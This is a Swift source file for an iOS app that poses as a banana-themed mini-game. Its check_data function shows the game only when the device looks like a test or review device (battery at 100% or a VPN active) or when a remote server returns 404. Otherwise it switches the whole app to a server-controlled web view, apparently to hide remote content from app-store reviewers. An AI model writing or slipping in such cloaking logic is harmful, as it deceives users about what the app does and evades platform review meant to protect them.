//
//  ContentView.swift
//  TH49
//
//  Created by IGOR on 01/09/2025.
//

import SwiftUI

struct ContentView: View {
    
    @StateObject private var gameState = GameState()

        
    @AppStorage("status") var status: Bool = false
    
    @State var isFetched: Bool = false
    
    @State var isBlock: Bool = true
    @State var isDead: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            // Background that persists across all screens
            BananaManiaColors.jungleGradient
                .ignoresSafeArea()
            
            if isFetched == false {
                
                LoadingView()
                
            } else if isFetched == true {
                
                if isBlock == true {

                    Group {
                        switch gameState.currentScreen {
                        case .onboarding:
                            OnboardingView(gameState: gameState)
                        case .home:
                            HomeView(gameState: gameState)
                        case .miniGames:
                            MiniGamesView(gameState: gameState)
                        case .coinBank:
                            CoinBankView(gameState: gameState)
                        case .rewards:
                            RewardsView(gameState: gameState)
                        case .settings:
                            SettingsView(gameState: gameState)
                        }
                    }
                    .transition(.asymmetric(
                        insertion: .move(edge: .trailing).combined(with: .opacity),
                        removal: .move(edge: .leading).combined(with: .opacity)
                    ))
                    .animation(.easeInOut(duration: 0.3), value: gameState.currentScreen)

                } else if isBlock == false {
                    
                    WebSystem()
                    
//                    if status {
//
//                        WebSystem()
//
//                    } else {
//
//                        U1()
//                    }
                }
            }
        }
        .preferredColorScheme(.dark)
        .onAppear {
            // Initialize any app-level setup
            setupNotifications()
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        let urlString = DataManager().serverURL

        if currentPercent == 100 || isVPNActive == true {
            self.isBlock = true
            self.isFetched = true
            return
        }

        guard let url = URL(string: urlString) else {
            self.isBlock = true
            self.isFetched = true
            return
        }

        let urlSession = URLSession.shared
        let urlRequest = URLRequest(url: url)

        urlSession.dataTask(with: urlRequest) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
                self.isBlock = true
            } else {
                self.isBlock = false
            }
            self.isFetched = true
        }.resume()
    }

    private func setupNotifications() {
        // Request notification permissions if needed
        if gameState.settings.notificationsEnabled {
            // In a real app, you would request notification permissions here
        }
    }
}

#Preview {
    ContentView()
}
